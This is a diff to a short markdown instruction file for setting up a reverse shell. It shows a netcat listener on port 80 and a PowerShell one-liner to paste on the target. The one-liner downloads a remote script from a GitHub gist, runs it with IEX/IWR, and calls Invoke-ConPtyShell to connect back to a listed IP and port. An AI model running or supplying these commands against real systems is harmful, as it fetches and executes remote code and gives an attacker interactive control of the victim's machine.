@@ -1,9 +1,11 @@
-## Server side
+## Server side (port 80)
+- Use 80/87
+```
 nc -lp 80
-
+```
 
 ## Client side
-- Paste in powershell
+- Paste in powershell and change ip address and port number
 ```ps
 IEX(IWR https://gist.githubusercontent.com/virejdasani/22573dcff0186f1b711613eb6de906ae/raw/76a062b356b3e2846f3625f1cb3ec6430621f840/payload.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.29.21 80
 ```
